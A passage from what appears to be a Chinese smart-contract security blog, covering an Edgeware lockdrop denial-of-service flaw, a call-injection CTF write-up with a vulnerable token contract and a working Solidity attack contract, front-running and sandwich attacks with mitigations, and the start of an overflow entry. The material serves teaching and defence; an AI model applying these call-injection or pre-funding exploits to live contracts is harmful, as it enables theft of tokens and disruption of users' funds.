就被冻结了</p></li><li>解决方案<br>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</li></ul><h2 id="逻辑设计错误"><a href="#逻辑设计错误" class="headerlink" title="逻辑设计错误"></a>逻辑设计错误</h2><p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p><p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function lock(Term term, bytes calldata edgewareAddr, bool isValidator)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        didStart</span><br><span class="line">        didNotEnd</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 eth &#x3D; msg.value;</span><br><span class="line">        address owner &#x3D; msg.sender;</span><br><span class="line">        uint256 unlockTime &#x3D; unlockTimeForTerm(term);</span><br><span class="line">        &#x2F;&#x2F; Create ETH lock contract</span><br><span class="line">        Lock lockAddr &#x3D; (new Lock).value(eth)(owner, unlockTime);</span><br><span class="line">        &#x2F;&#x2F; ensure lock contract has at least all the ETH, or fail</span><br><span class="line">        assert(address(lockAddr).balance &gt;&#x3D; msg.value);</span><br><span class="line">        emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码做了强制判断:<br><code>assert(address(lockAddr).balance &gt;= msg.value);</code><br>属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。 但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Call注入漏洞</title>
      <link href="/CallAttack/"/>
      <url>/CallAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="Call注入漏洞刷题实践"><a href="#Call注入漏洞刷题实践" class="headerlink" title="Call注入漏洞刷题实践"></a>Call注入漏洞刷题实践</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>写本文是为了总结一下博主在这两天中做一个靶场题目时遇到的一些问题，以及对call注入的一些见解。</p><h2 id="Call函数"><a href="#Call函数" class="headerlink" title="Call函数"></a>Call函数</h2><p>首先我们先了解一下call函数：<br/><br>合约之间的调用有2种方式： 底层的call方式和 new 合约的方式<br/><br>solidity 提供了 call()、delegatecall()、callcode() 三个函数来实现合约直接的调用及交互，这些函数的滥用导致了各种安全风险和漏洞。在使用第二种方式时，如果处理不当很可能产生致命的漏洞 —— 跨合约调用漏洞，主要就是 call() 注入函数导致的.</p><p>call() 函数对某个合约或者本地合约的某个方法的调用方式：</p><ul><li><code>&lt;address&gt;.call(方法选择器,arg1,arg2,...)</code></li><li><code>&lt;address&gt;.call(bytes)</code><blockquote><p>综上  合约之间的调用建议的方式是：通过new 合约，通过合约的方式去调用，而不是通过call的方式去调用，因为这样会失去控制权。<br/></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>接下来我们通过一个call注入攻击的案例来更深入的了解一下call函数:<br>2018年5月11日中午，ATN技术人员收到异常监控报告，显示ATN Token供应量出现异常，迅速介入后发现Token合约由于存在漏洞受到攻击。</p></blockquote></li></ul><p>ATN Token合约采用的是在传统ERC20Token合约基础上的扩展版本ERC223，并在其中使用了 dapphub/ds-auth 库。<br>单独使用 ERC223 或者 ds-auth 库时，并没有什么问题，但是两者结合时，黑客利用了回调函数回调了setOwner方法，从而获得高级权限。<br/><br>ERC223转账代码如下：<br><img src="/exm1.png" alt=""><br>黑客转账时在方法中输入了以下参数成功实现了攻击：<br><img src="/exm2.png" alt=""><br>该交易执行的时候 receiver 会被 <em>to(ATN合约地址) 赋值， ATN 合约会调用 _custom_fallback 即 DSAuth 中的 setOwner(adddress) 方法，而此时的 msg.sender 变为 ATN 合约地址，owner</em>参数为_from(黑客地址)。<br/><br>ds-auth库中setOwner 代码如下：<br><img src="/exm3.png" alt=""><br>在执行 <code>setOwner</code> 时会先验证 auth 合法性，而此时！ msg.sender 就是ATN的合约地址，因此完美的避开了auth的检查。setOwner 的 modifier auth 代码：<br><img src="/exm4.png" alt=""></p><blockquote><p>总的来说</p><ol><li>Call函数自由度过大，应谨慎使用作为底层函数，对于一些敏感操作或者权限判断函数，则不要轻易将合约自身的账户地址作为可信的地址。</li><li>调用的函数应该做严格的限制，避开调用任意函数的隐患</li><li>用到类似ERC223推荐实现的custom_fallback和ds-auth的合约，或者说内置有其他权限控制得合约的以太坊Token，很可能也存在这个call的注入问题</li></ol></blockquote><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>通过以上的介绍，想必大家对call函数以及其漏洞已经有了自己的理解。<br/><br>call函数出现在底层合约中需要格外重视，如非必要最好不要用，用new代替。<br/><br>call注入的主要攻击思路：</p><blockquote><p>由于call参数类型不限，这给了参数很大的自由度，黑客可以通过构造参数去调用与此合约相关联的所有方法，并且在调用时msg.sender的值会变为合约的地址，这可能会绕过关键函数的一些判断条件，从而使黑客通过”冒名调用”获得利益。</p></blockquote><h2 id="靶场题目："><a href="#靶场题目：" class="headerlink" title="靶场题目："></a>靶场题目：</h2><p>说了这么多，让我们回到问题的起点：<br>漏洞源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">contract Vuln&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    string public name     &#x3D; &quot;Chain&quot;;</span><br><span class="line">    string public symbol   &#x3D; &quot;CHA&quot;;</span><br><span class="line">    uint8  public decimals &#x3D; 18;</span><br><span class="line">    uint public totalSupply&#x3D;10000000000;</span><br><span class="line">    bool  public isLoan&#x3D;false;</span><br><span class="line">    bool public solved;</span><br><span class="line">    event  Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">    event  Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">    event  Deposit(address indexed to, uint number);</span><br><span class="line">    event  Withdrawal(address indexed from, uint number);</span><br><span class="line"></span><br><span class="line">    mapping (address &#x3D;&gt; uint)                       public  balanceOf;</span><br><span class="line">    mapping (address &#x3D;&gt; mapping (address &#x3D;&gt; uint))  public  allowance;</span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        owner&#x3D;msg.sender;</span><br><span class="line">        balanceOf[owner]&#x3D;totalSupply&#x2F;2;</span><br><span class="line">        balanceOf[address(this)]&#x3D;totalSupply&#x2F;2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; number);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; number;</span><br><span class="line">        (msg.sender).transfer(number);</span><br><span class="line">        emit Withdrawal(msg.sender, number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][to] &#x3D; number;</span><br><span class="line">        emit Approval(msg.sender, to, number);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">        balanceOf[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;</span><br><span class="line">        require(isLoan&#x3D;&#x3D;false&amp;&amp;value&gt;&#x3D;0&amp;&amp;value&lt;&#x3D;1000);</span><br><span class="line">        balanceOf[address(this)]-&#x3D;value;</span><br><span class="line">        balanceOf[target]+&#x3D;value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line"></span><br><span class="line">        isLoan&#x3D;true;</span><br><span class="line">        require(balanceOf[target]&gt;&#x3D;value);</span><br><span class="line">        balanceOf[address(this)]+&#x3D;value;</span><br><span class="line">        balanceOf[target]-&#x3D;value;</span><br><span class="line">        isLoan&#x3D;false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint number)</span><br><span class="line">        public</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; number);</span><br><span class="line"></span><br><span class="line">        if (from !&#x3D; msg.sender &amp;&amp; allowance[from][msg.sender] !&#x3D; 2**256-1) &#123;</span><br><span class="line">            require(allowance[from][msg.sender] &gt;&#x3D; number);</span><br><span class="line">            allowance[from][msg.sender] -&#x3D; number;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; number;</span><br><span class="line">        balanceOf[to] +&#x3D; number;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, number);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public returns(bool)&#123;</span><br><span class="line">        return solved;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete() public &#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[msg.sender]&gt;10000);</span><br><span class="line">        require(allowance[address(this)][msg.sender]&gt;10000);</span><br><span class="line">        solved&#x3D;true;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>拿到flag的要求是使isSolved()返回true</strong><br>读完源码后，发现题目要我们通过攻击达成<code>complete()</code>函数里的两个限制条件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function complete() public &#123;</span><br><span class="line"></span><br><span class="line">       require(balanceOf[msg.sender]&gt;10000);</span><br><span class="line">       require(allowance[address(this)][msg.sender]&gt;10000);</span><br><span class="line">       solved&#x3D;true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>即是让我们利用漏洞从合约成功盗取10000以上的token<br/><br>让我们把视线放到<code>fakeflashloan()</code>这个奇怪的函数上，可以注意到这个函数并没有很苛刻的“准入条件”，让我们可以很轻松的执行到里面的call方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;</span><br><span class="line">        require(isLoan&#x3D;&#x3D;false&amp;&amp;value&gt;&#x3D;0&amp;&amp;value&lt;&#x3D;1000);</span><br><span class="line">        balanceOf[address(this)]-&#x3D;value;</span><br><span class="line">        balanceOf[target]+&#x3D;value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line"></span><br><span class="line">        isLoan&#x3D;true;</span><br><span class="line">        require(balanceOf[target]&gt;&#x3D;value);</span><br><span class="line">        balanceOf[address(this)]+&#x3D;value;</span><br><span class="line">        balanceOf[target]-&#x3D;value;</span><br><span class="line">        isLoan&#x3D;false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>而call后面跟的参数是bytes类型的data,这就给了我们很大的操作空间。此时我至少想到了两种拿到flag的方式，一种是通过call注入调用transfer和approve函数给我自己转账，实现盗币后执行<code>complete()</code>方法。另一种方式比较投机取巧，通过call注入调用approve函数，<code>_to</code>填合约地址，这样allowance就记录了一个合约自己给自己的一笔token的approve，同样可以绕开complete的两个限制条件拿到flag<br/><br>但是我觉得题目的初衷应该是要我们完成盗币攻击，于是将其实现，攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">import&quot;.&#x2F;Vuln.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line"></span><br><span class="line">    Vuln cont;</span><br><span class="line">    </span><br><span class="line">    constructor(address _adr)&#123;</span><br><span class="line">        cont &#x3D; Vuln(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        bytes memory byt;</span><br><span class="line">        bytes memory byt2;</span><br><span class="line">        address adr&#x3D;0x100200fF289D4dA0634fF36d7f5D96524f7EFf67;&#x2F;&#x2F;我的账户地址</span><br><span class="line">        byt  &#x3D;  abi.encodePacked(bytes4(keccak256(&quot;transfer(address,uint256)&quot;)),bytes32(adr),bytes32(10001));</span><br><span class="line">        byt2 &#x3D;  abi.encodePacked(bytes4(keccak256(&quot;approve(address,uint256)&quot;)),bytes32(adr),bytes32(10001));</span><br><span class="line">        cont.fakeflashloan(1000,address(cont),byt);&#x2F;&#x2F;transfer 10001个token给我</span><br><span class="line">        cont.fakeflashloan(1000,address(cont),byt2);&#x2F;&#x2F;approve 10001个token的approve给我</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意：原题中用到了solidity7.0版本的编译环境，在新版的solidity中攻击合约中<code>bytes32(adr),bytes32(10001)</code>的语法是不被允许的,所以我直接选择了用更低版本的暂时替代。</p><blockquote><p>PS：有关新版本的写法我会在后续更新</p></blockquote><p>在这里我们通过调用<code>fakeflashloan()</code>这个问题函数，构造了<code>byt</code>和<code>byt2</code>这样的bytes去实现call注入的函数调用。</p><p>构造这个bytes占了我解题时常的90％，一直攻击无效，因为这个靶场测试网没办法debug,给我带来了很多困难。最终我选择脱离靶场的测试网环境，在本地进行测试。<br/><br>有关bytes的构造大家可以参考<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html?highlight=abi" target="_blank" rel="noopener">solidity的abi参考文档</a><br><img src="/abi.png" alt=""></p><h1 id="攻击效果："><a href="#攻击效果：" class="headerlink" title="攻击效果："></a>攻击效果：</h1><p>夺旗：<br><img src="/CallFlag.png" alt=""><br>合约被攻击后：<br><img src="/suc1.png" alt=""><br><img src="/suc2.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReentryAttack</title>
      <link href="/Front-Running/"/>
      <url>/Front-Running/</url>
      
        <content type="html"><![CDATA[<h1 id="抢先交易攻击（Front-Running）"><a href="#抢先交易攻击（Front-Running）" class="headerlink" title="抢先交易攻击（Front-Running）"></a>抢先交易攻击（Front-Running）</h1><hr><blockquote><p>author：Thomas_Xu</p></blockquote><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>简单来说，Front-Running 是指在一笔正常交易等待打包的过程中，抢跑机器人通过设置更高 Gas 费用抢先完成攻击交易，以此攫取用户利益的攻击行为。而 Mempool（交易池） 是一组已经广播到网络中并等待被打包进区块的以太坊交易，它是 Front-Running 可以实施的前提，抢跑机器人通过不断扫描 Mempool 中的交易，来分析发现可攻击的目标。</p></blockquote><p><br /><br>在所有 Front-Running 中，最典型最具危害性的就是针对 AMM(自由做市商) 交易的 Sandwich Attacks （三明治攻击），除此以外还有针对套利、清算交易、闪电贷等利用系统漏洞获利的抢跑攻击，攻击者数量众多，且由自动化脚本控制，永远不知疲倦，因此任何有利可图的交易都会遭受他们的饱和攻击，几乎没有幸免的可能。<br/></p><ul><li><strong>Sandwich Attacks</strong><br>首先我们来看一个真实的三明治攻击案例：<br><img src="Uniswap3.png" alt=""><br>上图可见，三笔交易在同一个区块被打包，两笔攻击交易（打上了黑客标记的）中间夹着一笔正常交易。其具体流程如下：<blockquote><ol><li>用户首先发起一笔正常交易，用 237000.705USDC 买入 DG，设置 Gas Price 为 40.5Gwei；</li><li>抢跑机器人检测到这笔有利可图的交易后，随即展开攻击，发起一笔买入交易，设定 GasPrice 为 49.9Gwei，凭借 Gas 竞争机制成功抢跑用户的正常交易；</li><li>与此同时，机器人发出另一笔卖出交易，设置 GasPrice 同样为 40.5Gwei，因为时间顺序的原因，紧贴着用户正常交易完成。</li></ol></blockquote></li></ul><p>一次完美的抢跑攻击完成，算上手续费，机器人共赚取 16448.012-16310.3-15.2-10.61 = $111.9，而这种两笔攻击交易夹着一笔正常交易的攻击，就被形象的称为三明治攻击。</p><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>我们知道，现如今的主流 DEX 如 Uniswap 等，采用的都是 AMM （自动化做市商）机制，其价格遵循恒定乘积公式。例如，在 Uniswap 中建立一个 A 代币与 ETH 的流动池，A 数量为 1000，ETH 数量为 100，则两者数量乘积为 100000，当前 A 价格为 0.1ETH。当 Alice 试图用 10 个 ETH 来池子里购买 A 时，他所得到的 A 的数量 X，可以用下面的公式推导 (注：为简化计算，以下均未考虑手续费)：<br/><br><code>（1000-X）\*（100+10）= 100000，X = 90.9</code><br/><br>这笔交易中，A 的价格为 10/90.9 = 0.11，相比于原来 A 的价格，价格滑点为 :（0.11-0.1）/0.1*100% = 10%一笔交易就让币价产生了 10% 的滑点，可见越是流动性差的池子，遇到大额交易，越是容易产生滑点。而如果，能在用户正常的大额交易前（预计该交易会产生较大滑点），抢先买入 A，再在用户正常交易后，将刚买入的 A 卖出，就可以获得一笔不菲的收益。沿用刚才的例子，假设在 Alice 的交易前，Bob 抢先花 5 个 ETH 购买 A，然后在 Alice 的交易完成后，Bob 再把之前买入的 A 卖出，我们看看会有什么样的结果。<br/><br>首先是 Bob 的抢跑交易：<br/><br><code>(1000-X)\*(100+5) = 100000, X = 47.62</code><br/><br>即，Bob 用 5ETH 购得 47.62 个 A接下来是 Alice 的正常交易，注意此时流动池中 A 的数量变为 952.38，ETH 的数量变为 105：<br/><br><code>(952.38-X)\*(105+10) = 100000, X = 82.81</code><br/><br>最后 Bob 卖出 47.62 个 A 的交易，此时流动性中 A 的数量为 869.57，ETH 的数量为 115：<br/><br><code>(869.57+47.62）\*（115-Y）= 100000，Y = 5.97</code><br/><br>通过这一次抢跑攻击，Bob 净赚 5.97-5 = 0.97 个 ETH，而 Alice 净亏 90.9-82.81 = 8.09 个 A，Bob 通过使 Alice 蒙受更大的滑点损失来获得自己的收益！</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>作为一般用户，应对 Front-Running 可以有以下几种手段：</p><blockquote><ul><li>设置较低的交易滑点，比如 0.1%，这会让抢跑机器人缺少可盈利的空间。 缺点：滑点过低导致大额交易十分容易失败，且失败的交易仍然需要支付高昂手续费。</li><li>提高 gas 费用，这会增加机器人的攻击成本。缺点：这同样也增加了自己的交易成本。<br/></li></ul></blockquote><p>可以看出，以上解决方案都是无奈之举，且有各种不足，幸运的是，有很多团队认识到了 Front-Running 的危害性，并提出了不少有建设性的解决方案。首先通过对捕猎全过程的分析，我们可以得出结论，要实现 Front-Running，需要几个要素：</p><blockquote><ul><li>Transaction 公开性：可以在交易池中获取交易的详细信息以太坊交易执行机制：</li><li>可以通过 gas 竞争的方式抢先完成交易</li><li>AMM 交易曲线机制：恒定乘积机制可以造成较大滑点</li></ul></blockquote><p>反制手段就是分别在这几个要素上做文章。</p><ul><li><strong>避免Transaction公开性</strong><br/><br>  既然机器人是通过分析交易池中的交易来决定是否发起攻击，那么我们将交易信息直接加密，让机器人看不到或者看不懂不就好了？<br/><br>  社区中就有人提议使用零知识证明技术 zk-SNARKs 来达成上述目标，即运用 zk-SNARKs 将每笔交易的信息都加密隐藏起来，让机器人无从下手。<br/><br>  不过，目前该方案还不够成熟，存在需要消耗更高 Gas 费用和可能被利用来进行阻塞攻击，导致系统化整体 liveness 的缺陷。<br>  <br/></li><li><p><strong>更改以太坊交易执行机制</strong><br/><br>  当前的以太坊交易执行机制是通过 Gas 竞争来完成的，即谁出的 Gas 费高，矿工就优先打包谁的交易，那么我们如果绕过这种机制，把交易发给矿工让其直接打包，就杜绝了抢跑机器人在中途攻击的可能性<br/><br>  所以一种类似于 Layer 0 的方案也得到了一些应用，如星火矿池的 Taichi 服务，用户可以直接在 MetaMask 中设置 Taichi 的以太坊节点，这样交易就直接在没有出现在 Mempool 的情况下被打包了，但劣势是被打包的时效有一定的不确定性。<br/><br>  另外，如 ArcherSwap 类似理念的解决方案，构建了交易者和矿工之间的桥梁，交易者可以通过打赏的形式让矿工直接打包自己的交易，这就避免了被 Front-Running 的可能。虽然有那么点交保护费来避免被攻击的感觉，但也实实在在的降低了交易者的成本，而且有着不收取交易失败费用的优势。</p></li><li><p><strong>AMM 算法优化</strong><br>  在 AMM 机制下，大额交易产生过大的价格滑点（可理解为一个临时的错误价格），是 Front-Running 的利润空间，如果有一种 AMM 机制可以减少大额交易对后续交易价格的影响，就可以有效防止 Front-Running 攻击<br/><br>  早在 2018 年，Vitalik 在以太坊技术社区中提供了一个 方案，当发生兑换交易时，交易池价格不会立刻调整成真实价格，而是在若干分钟内，缓慢的趋向真实价格，这就好像交易池凭空多出了很多流动性一样，因此我们将这种技术称之为 Vitrual Balance （虚拟余额）技术。这种新机制，可大大压缩套利者的利润空间，有效防御 Front-Running 攻击，同时还可以增加流动性做市商的收益，可谓一举多得，1inch 的 mooniswap 就是这个方案的一个实现版本.</p></li><li><p><strong>增加流动性</strong><br>  此外，还有种思路，就是尽可能的加大交易池中特定价格区间的流动性，流动性越大，滑点越小，当流动性大到一定程度的时候，抢跑机器人就丧失了盈利空间，Uniswap 的 V3 版本的聚焦流动性特性，就是在这方面做出的努力。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OverflowAttack</title>
      <link href="/OverflowAttack/"/>
      <url>/OverflowAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在介绍溢出攻击前，让我们先来了解一下solidity中溢出和下溢。</p><ul><li>溢出<br>  假设我们有一个 uint8, 只能存储8 bit数据。这意味着我们能存储的最大数字就是二进制 11111111 (或者说十进制的 2^8 - 1 = 255).<br/><br>  来看看下面的代码。最后 number 将会是什么值？<br/>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint8 number &#x3D; 255;</span><br><span class="line">number++; &#x2F;&#x2F;number &#x3D; 0</span><br></pre></td></tr></table></figure>  在这个例子中，我们导致了溢出 — 虽然我们加了1， 但是number 出乎意料地等于 0了。<br/><br>  <img src="overflow1.png" alt=""><br>  下溢(underflow)也类似，如果你从一个等于 0 的 uint8 减去 1, 它将变成 255 (因为 uint 是无符号的，其不能等于负数)。<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>上述就是在solidity中，数据溢出的原理，那么在智能合约中，由于合约代码考虑不规范，可能会导致合约数据溢出漏洞，下来举例一个在以太坊公链中有数据溢出BUG的合约代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Hexagon &#123;</span><br><span class="line">&#x2F;* Main information *&#x2F;</span><br><span class="line">string public constant name &#x3D; &quot;Hexagon&quot;;</span><br><span class="line">string public constant symbol &#x3D; &quot;HXG&quot;;</span><br><span class="line">uint8 public constant decimals &#x3D; 